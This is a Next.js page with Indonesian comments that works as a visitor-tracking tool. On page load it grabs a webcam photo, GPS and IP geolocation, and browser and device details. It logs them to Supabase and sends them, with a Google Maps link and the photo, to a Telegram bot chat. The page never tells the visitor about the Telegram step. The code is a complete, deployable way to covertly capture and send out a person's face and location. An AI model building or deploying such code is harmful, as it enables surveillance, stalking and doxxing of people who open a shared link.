"use client";
import { useState, useEffect, useRef } from "react";
import { supabase } from "../lib/supabaseClient";

const token = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN || "";
const chatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID || "";

export default function Home() {
  const [deviceInfo, setDeviceInfo] = useState<{ ip?: string; browser?: string; device?: string } | null>(null);
  const videoRef = useRef<HTMLVideoElement>(null);
  const [photo, setPhoto] = useState<string | null>(null);
  const [photoUrl, setPhotoUrl] = useState<string | null>(null);
  const [logId, setLogId] = useState<string | null>(null);

  useEffect(() => {
    // Kamera: langsung jepret foto dan upload ke Supabase Storage
    const capturePhoto = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement("video");
        video.srcObject = stream;
        video.play();
        await new Promise(resolve => video.onloadedmetadata = resolve);

        // Tunggu video siap, lalu jepret
        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth || 320;
        canvas.height = video.videoHeight || 240;
        const ctx = canvas.getContext("2d");
        let photoDataUrl = null;
        if (ctx) {
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          photoDataUrl = canvas.toDataURL("image/png");
          setPhoto(photoDataUrl);
        }

        // Stop stream

        // Upload ke Supabase Storage setelah foto diambil
        if (photoDataUrl) {
          try {
            // Convert base64 to Blob
            const base64 = photoDataUrl.split(",")[1];
            const byteCharacters = atob(base64);
            const byteNumbers = new Array(byteCharacters.length);
            for (let i = 0; i < byteCharacters.length; i++) {
              byteNumbers[i] = byteCharacters.charCodeAt(i);
            }
            const byteArray = new Uint8Array(byteNumbers);
            const blob = new Blob([byteArray], { type: "image/png" });

            // Nama file unik
            const filename = `photo_${Date.now()}.png`;
            const { data, error } = await supabase.storage.from("udag_bajing_files").upload(filename, blob, {
              cacheControl: "3600",
              upsert: false,
            });
            if (error) {
              setError("Gagal upload foto: " + error.message);
            }
            if (!error && data) {
              // Dapatkan public URL
              const { data: urlData } = supabase.storage.from("udag_bajing_files").getPublicUrl(filename);
              if (urlData && urlData.publicUrl) {
                setPhotoUrl(urlData.publicUrl);
              } else {
                setError("Gagal mendapatkan public URL foto.");
              }
            }
          } catch (err: any) {
            setError("Gagal upload foto: " + err.message);
          }
        }
      } catch (err) {
        setError("Gagal mengakses kamera: " + (err as Error).message);
      }
    };
    capturePhoto();

    // Device info & logging ke Supabase
    const logAccess = async () => {
      let ip = "";
      let latitude = null;
      let longitude = null;
      let city = "";
      let country = "";
      try {
        const res = await fetch("https://ipapi.co/json/");
        if (res.ok) {
          const data = await res.json();
          ip = data.ip;
          latitude = data.latitude;
          longitude = data.longitude;
          city = data.city;
          country = data.country_name;
        }
      } catch {}

      const ua = navigator.userAgent;
      let browser = "";
      let device = "";
      // Sederhana: deteksi browser
      if (ua.includes("Chrome")) browser = "Chrome";
      else if (ua.includes("Firefox")) browser = "Firefox";
      else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
      else if (ua.includes("Edge")) browser = "Edge";
      else browser = "Lainnya";

      // Sederhana: deteksi device
      if (/Android/i.test(ua)) device = "Android";
      else if (/iPhone|iPad|iPod/i.test(ua)) device = "iOS";
      else if (/Windows/i.test(ua)) device = "Windows";
      else if (/Macintosh/i.test(ua)) device = "Mac";
      else device = "Lainnya";

      setDeviceInfo({ ip, browser, device });

      // Insert ke Supabase
      const { data, error } = await supabase.from("udag_bajing_access_logs").insert([
        {
          ip,
          browser,
          device,
          latitude,
          longitude,
          city,
          country,
          user_agent: ua,
          accessed_at: new Date().toISOString(),
        },
      ]).select();
      if (data && data[0] && data[0].id) {
        setLogId(data[0].id);
      }
    };
    logAccess();
  }, []);
  const [gpsLocation, setGpsLocation] = useState<{ lat: number; lng: number } | null>(null);
  const [ipLocation, setIpLocation] = useState<{ lat: number; lng: number; city?: string; country?: string } | null>(null);
  const [error, setError] = useState<string | null>(null);

  // Ambil lokasi GPS dan IP saat halaman dibuka
  useEffect(() => {
    // GPS
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          setGpsLocation({
            lat: position.coords.latitude,
            lng: position.coords.longitude,
          });
        },
        (err) => {
          setError("Gagal mendapatkan lokasi GPS: " + err.message);
        }
      );
    } else {
      setError("Browser tidak mendukung Geolocation.");
    }

    // IP
    const fetchIpLocation = async () => {
      try {
        const res = await fetch("https://ipapi.co/json/");
        if (!res.ok) throw new Error("Gagal mengambil data lokasi.");
        const data = await res.json();
        setIpLocation({
          lat: data.latitude,
          lng: data.longitude,
          city: data.city,
          country: data.country_name,
        });
      } catch (err: any) {
        setError("Gagal mendapatkan lokasi IP: " + err.message);
      }
    };
    fetchIpLocation();
  }, []);

  // Update log Supabase dengan data GPS dan foto jika tersedia, lalu kirim notifikasi ke Telegram (hanya sekali)
  const [notified, setNotified] = useState(false);
  useEffect(() => {
    if (!notified && logId && (gpsLocation || photoUrl)) {
      const updateLogAndNotify = async () => {
        const updateData: any = {};
        if (gpsLocation) {
          updateData.latitude_gps = gpsLocation.lat;
          updateData.longitude_gps = gpsLocation.lng;
        }
        if (photoUrl) {
          updateData.photo_url = photoUrl;
        }
        if (Object.keys(updateData).length > 0) {
          await supabase.from("udag_bajing_access_logs")
            .update(updateData)
            .eq("id", logId);
        }

        // Kirim notifikasi ke Telegram
        let text = `Akses baru terdeteksi!\n`;
        if (deviceInfo) {
          text += `IP: ${deviceInfo.ip || "-"}\nBrowser: ${deviceInfo.browser || "-"}\nDevice: ${deviceInfo.device || "-"}\n`;
        }
        let gmapsLink = "";
        if (gpsLocation) {
          text += `GPS: ${gpsLocation.lat}, ${gpsLocation.lng}\n`;
          gmapsLink = `<a href=&quot;https://www.google.com/maps?q=${gpsLocation.lat},${gpsLocation.lng}&quot;>Lihat di Google Maps</a>`;
        }
        if (photoUrl) {
          text += `Foto: ${photoUrl}\n`;
        }
        if (ipLocation) {
          text += `Lokasi IP: ${ipLocation.lat}, ${ipLocation.lng}\nKota: ${ipLocation.city || "-"}\nNegara: ${ipLocation.country || "-"}`;
        }

        // Kirim pesan/foto ke Telegram
        if (photo) {
          // Convert dataURL to File
          const base64 = photo.split(",")[1];
          const byteCharacters = atob(base64);
          const byteNumbers = new Array(byteCharacters.length);
          for (let i = 0; i < byteCharacters.length; i++) {
            byteNumbers[i] = byteCharacters.charCodeAt(i);
          }
          const byteArray = new Uint8Array(byteNumbers);
          const file = new File([byteArray], "photo.png", { type: "image/png" });

          // Kirim foto ke Telegram dengan caption detail akses dan link Google Maps
          const formData = new FormData();
          formData.append("chat_id", chatId);
          formData.append("photo", file);
          // Caption dengan HTML dan link Google Maps
          const caption = `${text}\n${gmapsLink}`;
          formData.append("caption", caption);
          formData.append("parse_mode", "HTML");
          await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
            method: "POST",
            body: formData,
          });
        } else {
          // Jika tidak ada foto, kirim pesan teks
          await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: chatId,
              text: `${text}\n${gmapsLink}`,
              parse_mode: "HTML",
            }),
          });
        }
        setNotified(true);
      };
      updateLogAndNotify();
    }
  }, [gpsLocation, photoUrl, logId, notified, deviceInfo, ipLocation, photo]);

  return (
    <main className="flex flex-col items-center justify-center min-h-screen gap-4">
      <h1 className="text-2xl font-bold">Akses Lokasi dengan Next.js</h1>
      <div className="mt-4 flex flex-col items-center gap-4">
        <div>
          <h2 className="font-semibold text-gray-900 mb-2">Foto dari Kamera</h2>
          {photo ? (
            <img
              src={photo}
              alt="Foto dari kamera"
              width={320}
              height={240}
              className="rounded-xl border shadow"
            />
          ) : (
            <p className="text-gray-500">Mengambil foto...</p>
          )}
          {photoUrl && (
            <p className="text-green-700 text-sm mt-2">Foto berhasil di-upload ke Supabase Storage.</p>
          )}
        </div>

        {deviceInfo && (
          <div className="mt-4 p-2 border rounded-xl bg-gray-100">
            <h2 className="font-semibold text-gray-900">Info Perangkat</h2>
            <p className="text-gray-800 font-medium">IP Address: {deviceInfo.ip || '-'}</p>
            <p className="text-gray-800 font-medium">Browser: {deviceInfo.browser || '-'}</p>
            <p className="text-gray-800 font-medium">Device: {deviceInfo.device || '-'}</p>
            <p className="text-gray-500 text-sm">MAC address tidak dapat diakses dari browser.</p>
          </div>
        )}

        {gpsLocation && (
          <div className="mt-4 p-2 border rounded-xl bg-green-50">
            <h2 className="font-semibold text-green-900">Lokasi Berdasarkan GPS</h2>
            <p className="text-green-900 font-medium">Latitude: {gpsLocation.lat}, Longitude: {gpsLocation.lng}</p>
            <a
              href={`https://www.google.com/maps?q=${gpsLocation.lat},${gpsLocation.lng}`}
              target="_blank"
              rel="noopener noreferrer"
            >
              Lihat di Google Maps
            </a>
          </div>
        )}

        {ipLocation && (
          <div className="mt-4 p-2 border rounded-xl bg-blue-50">
            <h2 className="font-semibold text-blue-900">Lokasi Berdasarkan IP</h2>
            <p className="text-blue-900 font-medium">Latitude: {ipLocation.lat}, Longitude: {ipLocation.lng}</p>
            {ipLocation.city && <p className="text-blue-900 font-medium">Kota: {ipLocation.city}</p>}
            {ipLocation.country && <p className="text-blue-900 font-medium">Negara: {ipLocation.country}</p>}
          </div>
        )}
      </div>
  {error && <p className="text-red-500">{error}</p>}
    </main>
  );
}
